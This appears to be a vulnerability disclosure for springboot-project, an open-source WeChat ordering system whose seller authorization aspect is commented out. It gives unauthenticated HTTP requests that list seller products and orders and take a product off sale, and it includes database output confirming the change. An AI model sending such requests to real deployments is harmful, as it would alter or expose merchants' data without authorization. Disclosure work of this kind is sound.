# springboot-project Seller-Side Authentication Bypass Vulnerability Report

## Vulnerability Description

springboot-project (SqMax/springboot-project, an open-source WeChat ordering/dining system on GitHub, aka imooc sell): the seller-side authorization component `SellerAuthorizeAspect` has its **AOP pointcut (`@Pointcut`) and the authorization check method (`@Before`/`doVerify`) entirely commented out**, and the project has **no other interceptor or filter**. As a result the seller management interfaces `/seller/product/**`, `/seller/order/**`, `/seller/category/**` are **reachable with zero credentials** — no login, no cookie, no Redis session. An unauthenticated attacker can list all products/orders, put products on/off sale, finish/cancel orders, and modify categories. Verified: an unauthenticated `off_sale` request successfully changed the product status in the database.

## Affected Versions

springboot-project Seller-Side v1.0.0

## Exploitation Conditions

- Exposed `/seller/product/**`, `/seller/order/**`, `/seller/category/**` — no login required

## Reproduction

Home page:

```http
GET /sell/seller/product/list HTTP/1.1
Host: 127.0.0.1:8082
```

**1. Unauthenticated Access to the Seller Product List**

The response returns the "卖家后端管理系统" (seller backend management system) product page containing the products (皮蛋瘦肉粥/冰糖雪梨/测试商品) — **no login redirect**.

**2. Unauthenticated Access to the Seller Order List**

```http
GET /sell/seller/order/list HTTP/1.1
Host: 127.0.0.1:8082
```

Returns the order management page without any authentication.

![image-20260823144249642](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823144249642.3k8qv95bd8.webp)

**3. Unauthenticated Product Deactivation (Write Operation)**

```http
GET /sell/seller/product/off_sale?productId=P001 HTTP/1.1
Host: 127.0.0.1:8082
```

Response `HTTP/1.1 200` "成功!"; in the database `product_info.product_status` of P001 changed from `0` to `1` (off-sale took effect and persisted).

```sql
mysql> SELECT product_id, product_name, product_status FROM sell.product_info WHERE product_id='P001';
+------------+--------------+----------------+
| product_id | product_name | product_status |
+------------+--------------+----------------+
| P001       | 皮蛋瘦肉粥      | 1              |
+------------+--------------+----------------+
```

![image-20260823144322742](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823144322742.58i3sfvz76.webp)

![image-20260823144457774](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823144457774.5xbdcgjsd7.webp)

Code:

![image-20260823144533580](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823144533580.5trreqqzuy.webp)

```java
// SellerAuthorizeAspect.java:32-54 — the entire authorization logic is commented out
@Aspect
@Component
@Slf4j
public class SellerAuthorizeAspect {
    //    @Pointcut("execution(public * com.imooc.controller.Seller*.*(..))"+
    //    "&& !execution(public * com.imooc.controller.SellerUserController.*(..))")
    //    public void verify(){}
    //
    //    @Before("verify()")
    //    public void doVerify(){
    //        //query cookie token + validate redis session
    //    }
    // Class body is empty — no authorization logic at all
}
```
